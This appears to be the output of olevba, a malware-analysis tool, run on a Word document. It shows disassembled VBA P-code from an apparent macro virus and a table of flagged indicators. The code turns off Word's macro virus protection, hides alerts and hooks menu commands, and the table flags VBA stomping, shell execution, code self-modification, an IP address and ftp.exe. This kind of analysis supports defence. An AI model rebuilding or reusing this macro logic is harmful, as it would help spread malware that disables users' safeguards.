' 	EndIf 
' Line #181:
' 	EndWith 
' Line #182:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #183:
' 	ElseBlock 
' Line #184:
' 	ArgsCall ViewVbCode 0x0000 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	Label batal 
' Line #187:
' 	EndSub 
' Line #188:
' 	FuncDefn (Sub FileTemplates())
' Line #189:
' 	ArgsCall WBF 0x0000 
' Line #190:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #191:
' 	EndSub 
' Line #192:
' 	FuncDefn (Sub FormatStyle())
' Line #193:
' 	ArgsCall WBF 0x0000 
' Line #194:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #195:
' 	EndSub 
' Line #196:
' 	FuncDefn (Function Refresh())
' Line #197:
' 	LitVarSpecial (True)
' 	St reset 
' Line #198:
' 	ArgsCall FileTemplates 0x0000 
' Line #199:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #200:
' 	EndFunc 
' Line #201:
' 	FuncDefn (Sub AutoClose())
' Line #202:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #203:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #204:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #205:
' 	LitDI2 0x000A 
' 	MemStWith SaveInterval 
' Line #206:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #207:
' 	EndWith 
' Line #208:
' 	LineCont 0x0004 15 00 00 00
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0007 "Titasic"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "Docume"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall AstMaster 0x0000 
' 	EndIf 
' Line #209:
' 	EndSub 
' Line #210:
' 	FuncDefn (Sub FileExit())
' Line #211:
' 	ArgsCall AutoExit 0x0000 
' Line #212:
' 	EndSub 
' Line #213:
' 	FuncDefn (Sub ToolsOptions())
' Line #214:
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #215:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #216:
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #217:
' 	EndSub 
' Line #218:
' 	FuncDefn (Function WBT())
' Line #219:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #220:
' 	EndFunc 
' Line #221:
' 	FuncDefn (Function WBF())
' Line #222:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #223:
' 	EndFunc 
' Line #224:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |ToggleButton1_Click |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

